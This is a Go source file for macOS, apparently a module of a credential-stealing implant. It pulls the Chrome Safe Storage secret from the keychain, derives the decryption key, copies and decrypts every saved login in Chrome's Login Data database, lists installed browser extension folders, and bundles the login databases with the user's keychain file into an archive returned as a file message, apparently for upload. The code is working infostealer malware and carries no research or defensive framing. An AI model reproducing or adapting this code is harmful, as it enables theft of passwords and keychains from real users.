//go:build darwin
// +build darwin

package auto

import (
	"bits-project/bits/config"
	"bits-project/bits/util"
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/sha1"
	"database/sql"
	"errors"
	"fmt"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"strconv"

	"golang.org/x/crypto/pbkdf2"
	_ "modernc.org/sqlite"
)

var (
	SALT       = "saltysalt"
	ITERATIONS = 1003
	KEYLENGTH  = 16
)

func getDerivedKey() ([]byte, error) {

	out, err := exec.Command(
		`/usr/bin/security`, `find-generic-password`,
		`-s`, `Chrome Safe Storage`,
		`-wa`, `Chrome`,
	).Output()

	if err != nil {
		return nil, err
	}

	temp := []byte(strings.TrimSpace(string(out)))
	chromeSecret := temp[:len(temp)-1]

	if chromeSecret == nil {
		return nil, errors.New("Can not get keychain")
	}
	var chromeSalt = []byte("saltysalt")
	// @https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_mac.mm;l=157
	key := pbkdf2.Key(chromeSecret, chromeSalt, 1003, 16, sha1.New)
	return key, nil
}

func pkcs5UnPadding(origData []byte) []byte {
	length := len(origData)
	unpadding := int(origData[length-1])
	return origData[:(length - unpadding)]
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func processLoginDataFile(path string, mkey []byte, buf *bytes.Buffer) {

	//copy to temporary path
	newpath := filepath.Join(os.TempDir(), "l3fW3Fwt32.db")
	copyFileToDirectory(path, newpath)

	//Open Database
	db, err := sql.Open("sqlite", newpath)
	if err != nil {
		fmt.Fprintln(buf, err.Error())
		return
	}
	// Open database. Close when we're done.
	defer db.Close()

	//Select Rows to get data from
	rows, err := db.Query("select origin_url, username_value, password_value from logins")
	if err != nil {
		fmt.Fprintln(buf, err.Error())
		return
	}
	defer rows.Close()

	for rows.Next() {
		var URL string
		var USERNAME string
		var PASSWORD string

		rows.Scan(&URL, &USERNAME, &PASSWORD)

		// decrypt passwords
		PASSWORD = PASSWORD[3:] // remove 'v10'

		// decrypt
		block, err := aes.NewCipher(mkey)
		if err != nil {
			fmt.Fprintln(buf, err.Error())
			continue
		}
		iv := make([]byte, 16)
		for i := 0; i < 16; i++ {
			iv[i] = ' '
		}

		ciphertext := []byte(PASSWORD)
		blockMode := cipher.NewCBCDecrypter(block, iv)
		origData := make([]byte, len(ciphertext))
		blockMode.CryptBlocks(origData, ciphertext)
		origData = pkcs5UnPadding(origData)

		if string(origData) != "" {
			fmt.Fprintln(buf, URL, " | ", USERNAME, " | ", string(origData))
		}

	}

}

func getDirectorySize(path string) (int64, error) {
	var totalSize int64
	err := filepath.WalkDir(path, func(_ string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if !d.IsDir() {
			info, err := d.Info()
			if err != nil {
				return err
			}
			totalSize += info.Size()
		}
		return nil
	})
	return totalSize, err
}

// listSubdirectories lists all subdirectories and their sizes.
func listSubdirectories(buff *bytes.Buffer, root string, origin string) error {
	fmt.Printf("%s\n", root)
	fmt.Fprintf(buff, "%s\n", root)

	err := filepath.WalkDir(root, func(path string, d os.DirEntry, err error) error {
		if err != nil {
			return err
		}
		if d.IsDir() && (len(path) == (len(origin) + 33)) {
			size, err := getDirectorySize(path)

			var (name string)
			if len(path) > 32 {
				name = path[len(path)-32:]
			} else {
				// If the string is shorter than 32 characters, you can use the entire string
				name = path
			}

			if err != nil {
				fmt.Printf("   Failed to calculate size for %s: %v\n", name, err)
				fmt.Fprintf(buff, "   Failed to calculate size for %s: %v\n", name, err)
				return nil
			}

			formattedSize := fmt.Sprintf("%s", strconv.FormatInt(int64(size), 10))

			fmt.Printf("   Extension: %s, Size: %s bytes\n", name, formattedSize)
			fmt.Fprintf(buff, "   Extension: %s, Size: %s bytes\n", name, formattedSize)
		}

		return nil
	})
	return err
}

func AutoModeChromeCookie() (string, [][]byte) {
	print("=== AutoModeChromeCookie Start ===\n")

	var (
		buf          bytes.Buffer
		userdata_dir string
	)

	userdata_dir = getUserdataDir()

	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if (strings.Contains(path, "Local Extension Settings")) {
			if (path[len(path) - 24:] == "Local Extension Settings") {
				// List Extensions
				if err := listSubdirectories(&buf, path, path); err != nil {
					fmt.Fprintf(&buf, "AutoModeChromeCookie Error: %v\n", err)
				}
			}	
		}
		return nil
	})

	print("=== AutoModeChromeCookie End ===\n")

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = buf.Bytes()
	msg_type := config.MSG_LOG

	return msg_type, data
}

func AutoModeMacChromeLoginData() (string, [][]byte) {
	var (
		buf          bytes.Buffer
		userdata_dir string
		keychain_dir string
		path_list    []string
	)


	// gather
	userdata_dir = getUserdataDir()
	keychain_dir = getKeychainFileMacDir()
	// file system search
	_ = filepath.Walk(userdata_dir, func(path string, info os.FileInfo, err error) error {
		if info.Name() == logins_data_file {
			path_list = append(path_list, path)
		}
		return nil
	})
	path_list = append(path_list, keychain_dir);

	_ = util.Compress(&buf, path_list, true)

	// return
	data := make([][]byte, 3)
	data[0] = []byte(config.LOG_SUCCESS)
	data[1] = []byte("gatherchain.tar.gz")
	data[2] = buf.Bytes()
	msg_type := config.MSG_FILE

	return msg_type, data

}
